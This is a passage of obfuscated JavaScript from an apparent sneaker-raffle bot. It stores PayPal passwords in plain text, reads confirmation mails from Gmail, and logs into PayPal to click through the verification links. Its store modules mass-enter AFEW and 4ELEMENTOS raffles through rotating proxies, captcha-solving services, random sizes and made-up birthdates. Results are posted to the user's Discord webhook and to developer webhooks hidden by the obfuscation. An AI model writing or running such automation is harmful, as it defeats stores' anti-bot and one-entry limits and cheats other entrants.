        if (_0x1675b4['Option'] < _0x3e1501['length'])
            return _0x3e1501[_0x1675b4['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x1a90d1 = {}, _0x553639 = await _0x4a9170['get']('Email');
        _0x1a90d1['Email'] = _0x553639['Email'];
        var _0x28e4c3 = Math['round'](Math['random']() * (_0x16e4e9['length'] - 0x1));
        _0x1a90d1['Proxy'] = _0x16e4e9[_0x28e4c3], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x50bdd8 = await _0x4a9170['get']('Password');
        return _0x1a90d1['Password'] = _0x50bdd8['Password'], _0x44f9d7['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x1a90d1['Email'] + ',' + _0x1a90d1['Password'] + ',' + _0x1a90d1['Proxy']), _0x1a90d1;
    }
    let _0x38b118 = await _0x272aa7();
    var _0x4f9e03 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x5514f7 = await _0x4a9170['get']('Amount'), _0xec3ae8 = _0x5514f7['Amount'];
    async function _0x34fea1() {
        let _0x382f03 = 0x0;
        var _0x324280 = new _0x51270e({
            'user': _0x138f58['masterMail'],
            'password': _0x138f58['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x1bc5e6(_0x209ad5) {
            _0x324280['openBox']('INBOX', ![], _0x209ad5);
        }
        _0x324280['once']('ready', function () {
            _0x1bc5e6(function (_0x19398f, _0x1b74bc) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x19398f)
                    throw _0x19398f;
                _0x324280['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x11662e, _0xa4900b) {
                    if (!_0xa4900b || !_0xa4900b['length'])
                        console['log'](_0x5d34e1() + '\x20[' + _0x1f11b3 + ']\x20No\x20mails\x20found'), _0x324280['end']();
                    else {
                        _0xa4900b = _0xa4900b['slice'](0x0, _0xec3ae8);
                        var _0x59f372 = _0x324280['seq']['fetch'](_0xa4900b, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x59f372['on']('message', function (_0x86a104, _0x44a7a7) {
                            var _0x470d10 = '(#' + _0x44a7a7 + ')\x20';
                            _0x86a104['on']('body', function (_0x1827d2, _0x1f39d3) {
                                _0x3bc712(_0x1827d2, (_0x10ed55, _0x10bae2) => {
                                    if (_0x10bae2['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x10bae2['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x10bae2['text']['split']('[')[0x2];
                                        var _0x499f51 = mes['split'](']')[0x0];
                                        _0x4f9e03['push'](_0x499f51);
                                    }
                                });
                            }), _0x86a104['once']('end', function () {
                                _0x382f03++;
                            });
                        }), _0x59f372['once']('error', function (_0x45c49c) {
                            console['log']('Fetch\x20error:\x20' + _0x45c49c);
                        }), _0x59f372['once']('end', function () {
                            _0x324280['end']();
                        });
                    }
                });
            });
        }), _0x324280['once']('error', function (_0x3fa932) {
            console['log'](_0xc3fc3['red'](_0x3fa932['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x324280['once']('end', async function () {
        }), _0x324280['connect']();
    }
    try {
        _0x34fea1(), await _0x497396(0xfa0), console['log']('Found\x20' + _0x4f9e03['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x497396(0xfa0);
    }
    var _0x3922e0;
    _0x38ef83('' + _0x1f11b3);
    var _0x4fb4dc = _0x38b118['Proxy']['split'](':'), _0x327ab2;
    try {
        _0x327ab2 = await _0x256d58['launch']({
            'userDataDir': 'sessions/' + _0x38b118['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4fb4dc[0x0] + ':' + _0x4fb4dc[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x327ab2 = await _0x256d58['launch']({
            'userDataDir': 'sessions/' + _0x38b118['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4fb4dc[0x0] + ':' + _0x4fb4dc[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x5d34e1() + '\x20[' + _0x1f11b3 + ']\x20Getting\x20Session');
        const _0x1bf27d = await _0x327ab2['newPage']();
        await _0x1bf27d['authenticate']({
            'username': '' + _0x4fb4dc[0x2],
            'password': '' + _0x4fb4dc[0x3]
        }), await _0x1bf27d['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x1bf27d['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x5d34e1() + '\x20[' + _0x1f11b3 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x1bf27d['waitForSelector']('#email');
            let _0x5d3c29 = await _0x1bf27d['$eval']('#email', _0x2426e5 => _0x2426e5['getAttribute']('value'));
            if (_0x5d3c29 == '') {
                await _0x1bf27d['type']('#email', _0x38b118['Email']), await _0x497396(0x1d3);
                let _0x3a8da3 = await _0x1bf27d['$']('#splitPassword');
                _0x3a8da3 && (await _0x1bf27d['click']('#btnNext'), await _0x497396(0xa28)), await _0x1bf27d['type']('#password', _0x38b118['Password']), await _0x497396(0x35c), await _0x1bf27d['click']('#btnLogin');
            } else
                await _0x1bf27d['type']('#password', _0x38b118['Password']), await _0x497396(0x35c), await _0x1bf27d['click']('#btnLogin');
            await _0x1bf27d['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x5d34e1() + '\x20[' + _0x1f11b3 + ']\x20Successfully\x20logged\x20in'), await _0x497396(0x2710);
        } catch (_0x554a11) {
            throw new Error('Login\x20session\x20expired\x20' + _0x554a11);
        }
        for (var _0x5d6697 = 0x0; _0x5d6697 < _0x4f9e03['length']; _0x5d6697++) {
            console['log'](_0x5d34e1() + '\x20[' + _0x1f11b3 + ']\x20Task\x20' + (_0x5d6697 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x38ef83(_0x1f11b3 + '\x20Task\x20' + (_0x5d6697 + 0x1) + '\x20/\x20' + _0x4f9e03['length']);
            const _0x23f19d = await _0x327ab2['newPage']();
            await _0x23f19d['goto']('' + _0x4f9e03[_0x5d6697], { 'waitUntil': 'networkidle2' }), await _0x497396(0xbb8);
            try {
                const _0x38f2a1 = await _0x23f19d['$']('#challenge-heading');
                _0x38f2a1 && (console['log'](_0x5d34e1() + '\x20[' + _0x1f11b3 + ']\x20Task\x20' + (_0x5d6697 + 0x1) + '\x20:\x20' + _0xc3fc3['yellow']('2FA\x20Required')), await _0x23f19d['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x497396(0x9c40), await _0x23f19d['waitForSelector']('#payment-submit-btn'), await _0x23f19d['$eval']('#payment-submit-btn', _0x1ba0a3 => _0x1ba0a3['click']()), await _0x23f19d['click']('#payment-submit-btn');
                try {
                    await _0x23f19d['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x497396(0x5dc), console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x1f11b3 + ']\x20Task\x20' + (_0x5d6697 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x16dd89) {
                    _0x393b93 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x16dd89['message']);
                } finally {
                    if (_0x393b93 == 'yes' && _0x352316 != 0x2) {
                        console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x1f11b3['name'] + ']\x20Task\x20' + (_0x5d6697 + 0x1) + '\x20:\x20Retrying\x20(' + _0x352316 + '\x20/\x205)')), _0x5d6697 = _0x5d6697 - 0x1, _0x352316 = _0x352316 + 0x1;
                        continue;
                    }
                    _0x393b93 == 'yes' && _0x352316 >= 0x2 && (_0x554010(csv[_0x5d6697], _0x1f11b3), _0x393b93 = 'no', _0x352316 = 0x0), await _0x23f19d['close'](), await _0x497396(0x4650);
                }
            } catch (_0x5c27c7) {
                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x1f11b3 + ']\x20Task\x20' + (_0x5d6697 + 0x1) + '\x20:\x20' + _0x5c27c7));
            }
        }
    } catch (_0x331a70) {
        console['log'](_0xc3fc3['red']('' + _0x331a70));
    } finally {
        await _0x327ab2['close']();
    }
}
const _0x3e5733 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0x35c245, _0x28886b, _0x27c8aa) {
                _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x138f58['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2c669a = 0x0; _0x2c669a < _0x28886b['length']; _0x2c669a++) {
                    if (_0x5ea1a1 != 'yes')
                        var _0x5ea1a1 = '', _0x2b9b5c = 0x0;
                    var _0xc2a54e;
                    try {
                        await _0x494c97(_0x28886b, _0x2c669a);
                    } catch {
                        _0x5ea1a1 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x38ef83(_0x35c245['name'] + '\x20Task\x20' + (_0x2c669a + 0x1) + '\x20/\x20' + _0x28886b['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                    var _0x4cdee1 = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x57a3d8 = Math['round'](Math['random']() * (_0x4cdee1['length'] - 0x1));
                    _0x28886b[_0x2c669a]['Size'] == 'RANDOM' && (_0x28886b[_0x2c669a]['Size'] = _0x4cdee1[_0x57a3d8]);
                    var _0x2604b2 = Math['round'](Math['random']() * (_0x27c8aa['length'] - 0x1)), _0x4c3d49 = _0x27c8aa[_0x2604b2]['split'](':'), _0x41521e;
                    try {
                        _0x41521e = await _0x256d58['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4c3d49[0x0] + ':' + _0x4c3d49[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x41521e = await _0x256d58['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4c3d49[0x0] + ':' + _0x4c3d49[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x5d34e1() + '\x20[' + _0x35c245['name'] + ']\x20Task\x20' + (_0x2c669a + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x56b643 = await _0x41521e['newPage']();
                        await _0x56b643['authenticate']({
                            'username': '' + _0x4c3d49[0x2],
                            'password': '' + _0x4c3d49[0x3]
                        }), await _0x56b643['setRequestInterception'](!![]), _0x56b643['on']('request', _0x38c393 => {
                            _0x38c393['resourceType']() === 'image' || _0x38c393['resourceType']() === 'font' || _0x38c393['resourceType']() === 'media' ? _0x38c393['abort']() : _0x38c393['continue']();
                        }), await _0x56b643['goto'](_0x28886b[_0x2c669a]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5d34e1() + '\x20[' + _0x35c245['name'] + ']\x20Task\x20' + (_0x2c669a + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x497396(0x3e8), await _0x56b643['waitForSelector']('#accept-all-gdpr'), await _0x56b643['click']('#accept-all-gdpr'), await _0x56b643['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x497396(0xbb8);
                        let _0x5f1404 = await _0x56b643['$$']('button');
                        for (button of _0x5f1404) {
                            let _0xb07f9b = await _0x56b643['evaluate'](_0x2fb070 => _0x2fb070['innerHTML'], button);
                            if (_0xb07f9b['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x497396(0x1388), await _0x56b643['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x5d34e1() + '\x20[' + _0x35c245['name'] + ']\x20Task\x20' + (_0x2c669a + 0x1) + '\x20:\x20Checking\x20Information'), await _0x497396(0x3e8);
                        let _0x5271e4 = await _0x56b643['$$']('input[name=\x22email\x22]');
                        await _0x5271e4[0x1]['click'](), await _0x497396(0x12c), await _0x56b643['keyboard']['type'](_0x28886b[_0x2c669a]['Email']), await _0x497396(0x1c2), await _0x56b643['type']('input[name=\x22Nombre\x22]', _0x28886b[_0x2c669a]['FirstName'] + '\x20' + _0x28886b[_0x2c669a]['LastName']), await _0x497396(0x1c2), await _0x56b643['type']('input[name=\x22Direccion\x22]', _0x28886b[_0x2c669a]['Address1'] + '\x20' + _0x28886b[_0x2c669a]['HouseNumber'] + '\x20' + _0x28886b[_0x2c669a]['Address2']), await _0x497396(0x1c2), await _0x56b643['type']('input[name=\x22Ciudad\x22]', _0x28886b[_0x2c669a]['City']), await _0x497396(0x1c2), await _0x56b643['type']('input[name=\x22Provincia\x22]', _0x28886b[_0x2c669a]['State']), await _0x497396(0x1c2), await _0x56b643['type']('input[name=\x22CP\x22]', _0x28886b[_0x2c669a]['Zip']), await _0x497396(0x1c2), await _0x56b643['select']('select[name=\x22Pais\x22]', _0x28886b[_0x2c669a]['Country']), await _0x497396(0x1c2), await _0x56b643['type']('input[name=\x22Telefono\x22]', _0x28886b[_0x2c669a]['Phone']), await _0x497396(0x1c2), await _0x56b643['type']('input[name=\x22cumple\x22]', _0x3fb485(0x1, 0x14) + '-' + _0x3fb485(0x1, 0xb) + '-' + _0x3fb485(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x497396(0x1c2), await _0x56b643['type']('input[name=\x22Instagram\x22]', _0x28886b[_0x2c669a]['Follower']), await _0x497396(0x1c2), await _0x56b643['type']('input[name=\x22Talla\x22]', _0x28886b[_0x2c669a]['Size']), await _0x497396(0x1f4), await _0x56b643['click']('#sexo_hombre'), await _0x497396(0x1f4), await _0x56b643['click']('#idioma_ingles'), await _0x497396(0x1f4), await _0x56b643['click']('#privacidad_si'), await _0x497396(0x1f4), await _0x56b643['click']('#acepta_suscripcion_si'), await _0x497396(0x1f4), console['log'](_0x5d34e1() + '\x20[' + _0x35c245['name'] + ']\x20Task\x20' + (_0x2c669a + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x152be0 = await _0x56b643['$$']('button');
                        for (button of _0x152be0) {
                            let _0x151580 = await _0x56b643['evaluate'](_0x4ae3af => _0x4ae3af['innerHTML'], button);
                            if (_0x151580['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x497396(0x1388), console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x35c245['name'] + ']\x20Task\x20' + (_0x2c669a + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x5ea1a1 = '';
                        var _0x587c0f = await _0x232baa(_0x28886b[_0x2c669a], _0x35c245, 'dev', ![]), _0x347c2f = await _0x232baa(_0x28886b[_0x2c669a], _0x35c245, 'pub', ![]);
                        const _0x473edd = {
                            'succesDEVMSG': { 'embeds': [_0x587c0f] },
                            'succesPUBMSG': { 'embeds': [_0x347c2f] }
                        };
                        try {
                            _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x473edd['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x473edd['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x196877, _0x473edd['succesPUBMSG']);
                        } catch (_0x3d54c4) {
                            console['log'](_0xc3fc3['yellow'](_0x5d34e1() + '\x20[' + _0x35c245['name'] + ']\x20Task\x20' + (_0x2c669a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3d54c4));
                        }
                    } catch (_0x42139d) {
                        console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x35c245['name'] + ']\x20Task\x20' + (_0x2c669a + 0x1) + '\x20:\x20' + _0x42139d)), _0xc2a54e = '' + _0x42139d;
                        var _0x597d10 = await _0x232baa(_0x28886b[_0x2c669a], _0x35c245, 'dev', !![], _0xc2a54e), _0x587c0f = await _0x232baa(_0x28886b[_0x2c669a], _0x35c245, 'dev', ![]), _0x347c2f = await _0x232baa(_0x28886b[_0x2c669a], _0x35c245, 'pub', ![]);
                        const _0x34d1c7 = {
                            'succesDEVMSG': { 'embeds': [_0x587c0f] },
                            'succesPUBMSG': { 'embeds': [_0x347c2f] }
                        };
                        _0x34d1c7['errorDEV'] = { 'embeds': [_0x597d10] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x34d1c7['errorDEV']), await _0x468b99(_0x432bcc, _0x34d1c7['errorDEV']), _0x42139d != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5ea1a1 = 'yes');
                    } finally {
                        _0x41521e['close']();
                        if (_0x5ea1a1 == 'yes' && _0x2b9b5c != 0x5 && _0xc2a54e != 'Size\x20Not\x20Found') {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x35c245['name'] + ']\x20Task\x20' + (_0x2c669a + 0x1) + '\x20:\x20Retrying\x20(' + _0x2b9b5c + '\x20/\x205)\x20')), _0x2c669a = _0x2c669a - 0x1, _0x2b9b5c = _0x2b9b5c + 0x1;
                            continue;
                        }
                        _0x5ea1a1 == 'yes' && _0x2b9b5c >= 0x5 && (_0x554010(_0x28886b[_0x2c669a], _0x35c245), _0x5ea1a1 = 'no', _0x2b9b5c = 0x0), console['log'](_0x5d34e1() + '\x20[' + _0x35c245['name'] + ']\x20Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x383aaf, _0x5cad6e, _0x230333) {
                for (var _0x1dfb17 = 0x0; _0x1dfb17 < _0x5cad6e['length']; _0x1dfb17++) {
                    _0x138f58['AfewDelay'] = _0x138f58['delay'];
                    var _0x51371a;
                    if (_0x1a0698 != 'yes')
                        var _0x1a0698 = '', _0x3d5e10 = 0x0;
                    var _0x534610 = _0x5cad6e[_0x1dfb17]['Url'], _0x25465a = _0x5cad6e[_0x1dfb17];
                    _0x38ef83(_0x383aaf['name'] + '\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20/\x20' + _0x5cad6e['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                    try {
                        await _0x494c97(_0x5cad6e, _0x1dfb17);
                    } catch {
                        _0x1a0698 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x31681c(_0x16ea59) {
                        const _0x429ac2 = _0x44f9d7['readFileSync']('../successful-tasks.csv', 'utf8'), _0x14a90e = _0x457f0a['parse'](_0x429ac2, { 'header': !![] })['data'];
                        let _0x18ee47 = ![];
                        for (var _0x309dba of _0x14a90e) {
                            if (_0x309dba['Url'] == _0x16ea59['Url'] && _0x309dba['Email'] == _0x16ea59['Email']) {
                                _0x18ee47 = !![];
                                break;
                            }
                        }
                        return _0x18ee47;
                    }
                    if (await _0x31681c(_0x5cad6e[_0x1dfb17]) == !![]) {
                        console['log'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x57bc2f = await _0x232baa(_0x5cad6e[_0x1dfb17], _0x383aaf, 'dev', ![]), _0x289fb9 = await _0x232baa(_0x5cad6e[_0x1dfb17], _0x383aaf, 'pub', ![]);
                    const _0x32b1c9 = {
                        'succesDEVMSG': { 'embeds': [_0x57bc2f] },
                        'succesPUBMSG': { 'embeds': [_0x289fb9] }
                    };
                    if (_0x5cad6e[_0x1dfb17]['Email'] == '' || _0x5cad6e[_0x1dfb17]['FirstName'] == '' || _0x5cad6e[_0x1dfb17]['LastName'] == '' || _0x5cad6e[_0x1dfb17]['Country'] == '' || _0x5cad6e[_0x1dfb17]['Size'] == '' || _0x5cad6e[_0x1dfb17]['Address1'] == '' || _0x5cad6e[_0x1dfb17]['Zip'] == '') {
                        console['log'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0x5cad6e[_0x1dfb17]['Country']['length'] == 0x2 && (_0x5cad6e[_0x1dfb17]['Country'] = _0x586632[_0x5cad6e[_0x1dfb17]['Country']]);
                    if (_0x138f58['useRandomProxy'] = ![])
                        var _0x595826 = _0x230333[_0x1dfb17]['split'](':');
                    else
                        var _0x2c207d = Math['round'](Math['random']() * (_0x230333['length'] - 0x1)), _0x595826 = _0x230333[_0x2c207d]['split'](':');
                    var _0xd7b288;
                    try {
                        _0xd7b288 = await _0x256d58['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x595826[0x0] + ':' + _0x595826[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0xd7b288 = await _0x256d58['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x595826[0x0] + ':' + _0x595826[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x2c061c = JSON['parse'](_0x44f9d7['readFileSync']('sizes.json', 'utf-8')), _0x534610 = _0x5cad6e[_0x1dfb17]['Url'], _0x5814f3 = _0x5cad6e[_0x1dfb17]['Size'], _0x37dee1;
                        async function _0xa631bb() {
                            var _0x4ace31 = new _0x36fa59['CookieJar']();
                            console['log'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x30dae0;
                            let _0x32689f = {
                                'method': 'GET',
                                'cookieJar': _0x4ace31,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x595826[0x2] + ':' + _0x595826[0x3] + '@' + _0x595826[0x0] + ':' + _0x595826[0x1]
                            }, _0xda5cf7 = _0x534610['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0xfccb15 = _0xda5cf7 + '.json', _0x23881b = await _0x2aead5(_0xfccb15);
                            console['log'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x101fa7 = _0x23881b['data']['product']['variants'];
                            if (_0x5814f3 != 'RANDOM') {
                                if (_0x101fa7[0x1]['option1']['includes']('W')) {
                                    const _0x440110 = _0x2c061c['women']['find'](_0x124611 => _0x124611['EUsize'] === _0x5814f3);
                                    _0x440110 && (_0x5814f3 = _0x440110['size']);
                                } else {
                                    if (_0x101fa7[0x1]['option1']['includes']('Y')) {
                                        const _0x3d6635 = _0x2c061c['men']['find'](_0x29f260 => _0x29f260['EUsize'] === _0x5814f3);
                                        _0x3d6635 && (_0x5814f3 = _0x3d6635['size'] + 'Y');
                                    } else {
                                        const _0x424731 = _0x2c061c['men']['find'](_0x402e95 => _0x402e95['EUsize'] === _0x5814f3);
                                        _0x424731 && (_0x5814f3 = _0x424731['size']);
                                    }
                                }
                                for (var _0x4a45b0 of _0x101fa7) {
                                    _0x4a45b0['option1'] == _0x5814f3 && (_0x30dae0 = _0x4a45b0['id']);
                                }
                            } else {
                                var _0x50b7c2 = Math['round'](Math['random']() * (_0x101fa7['length'] - 0x1));
                                _0x30dae0 = _0x101fa7[_0x50b7c2]['id'];
                            }
                            console['log'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x2aead5('https://raffles.afew-store.com/cart/' + _0x30dae0 + ':1'), _0x37dee1 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0xa631bb();
                        } catch (_0x5b3ed4) {
                            if (_0x5b3ed4['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x5b3ed4);
                        }
                        const _0x2261f5 = await _0xd7b288['newPage']();
                        await _0x2261f5['setDefaultNavigationTimeout'](0x1d4c0), await _0x2261f5['authenticate']({
                            'username': '' + _0x595826[0x2],
                            'password': '' + _0x595826[0x3]
                        }), await _0x2261f5['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2261f5['setRequestInterception'](!![]), _0x2261f5['on']('request', _0x527278 => {
                            _0x527278['resourceType']() === 'image' || _0x527278['resourceType']() === 'font' || _0x527278['resourceType']() === 'media' ? _0x527278['abort']() : _0x527278['continue']();
                        });
                        try {
                            await _0x2261f5['goto'](_0x37dee1, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x2261f5['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2261f5['type']('#checkout_email', '' + _0x5cad6e[_0x1dfb17]['Email']), await _0x497396(0x320), await _0x2261f5['type']('#checkout_attributes_instagram', '' + _0x5cad6e[_0x1dfb17]['Follower']), await _0x497396(0x320), await _0x2261f5['select']('#checkout_shipping_address_country', '' + _0x5cad6e[_0x1dfb17]['Country']), await _0x2261f5['waitForTimeout'](0x258), await _0x2261f5['type']('#checkout_shipping_address_first_name', '' + _0x5cad6e[_0x1dfb17]['FirstName']), await _0x2261f5['waitForTimeout'](0x320), await _0x2261f5['type']('#checkout_shipping_address_last_name', '' + _0x5cad6e[_0x1dfb17]['LastName']), await _0x2261f5['waitForTimeout'](0x2bc), await _0x2261f5['type']('#checkout_shipping_address_address1', _0x5cad6e[_0x1dfb17]['Address1'] + '\x20' + _0x5cad6e[_0x1dfb17]['HouseNumber']), await _0x2261f5['waitForTimeout'](0x2bc), await _0x2261f5['type']('#checkout_shipping_address_address2', '' + _0x5cad6e[_0x1dfb17]['Address2']), await _0x2261f5['waitForTimeout'](0x2bc), await _0x2261f5['type']('#checkout_shipping_address_zip', '' + _0x5cad6e[_0x1dfb17]['Zip']), await _0x2261f5['waitForTimeout'](0x2bc), await _0x2261f5['type']('#checkout_shipping_address_city', '' + _0x5cad6e[_0x1dfb17]['City']), await _0x2261f5['waitForTimeout'](0x2bc);
                        if (_0x5cad6e[_0x1dfb17]['State'] != '')
                            try {
                                const _0x594851 = JSON['parse'](_0x44f9d7['readFileSync']('States.json', 'utf8'));
